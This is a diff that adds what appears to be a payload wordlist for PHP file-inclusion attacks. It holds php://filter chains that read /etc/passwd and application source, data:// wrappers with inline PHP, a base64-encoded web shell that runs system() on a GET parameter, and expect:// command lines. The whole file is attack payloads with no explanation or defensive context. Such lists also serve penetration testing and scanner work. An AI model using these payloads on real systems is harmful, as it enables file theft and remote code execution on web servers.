@@ -1,0 +1,23 @@
+php://filter/convert.base64-encode/resource=file://
+php://filter/convert.base64-encode/resource=index
+php://filter/read=string.toupper|string.rot13|string.tolower/resource=file://
+php://filter/string.toupper/string.rot13/string.tolower/resource=file://
+php://filter/string.strip_tags/resource=data://text/plain,<b>Bold</b><?php echo '<h1>hello</h1>';  ?>
+php://filter/read=string.rot13/resource=index.php
+php://filter/convert.iconv.utf-8.utf-16/resource=index.php
+php://filter/convert.base64-decode/resource=data://plain/text,aGVsbG8=
+php://filter/convert.base64-encode|convert.base64-decode/resource=file:///etc/passwd
+php://filter/convert.quoted-printable-encode/resource=data://plain/text,£hellooo=
+php://filter/convert.quoted-printable-encode/resource=data://plain/text,£hellooo=
+php://filter/convert.iconv.utf-8.utf-16le/resource=data://plain/text,trololohellooo=
+php://filter/zlib.deflate/convert.base64-encode/resource=file:///etc/passwd
+php://filter/zlib.inflate/resource=test.deflated
+data://text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
+data://text/plain,<?php phpinfo(); ?>
+data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
+data:text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
+data:text/plain,<?php phpinfo(); ?>
+data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
+expect://id
+expect://ls
+php://input
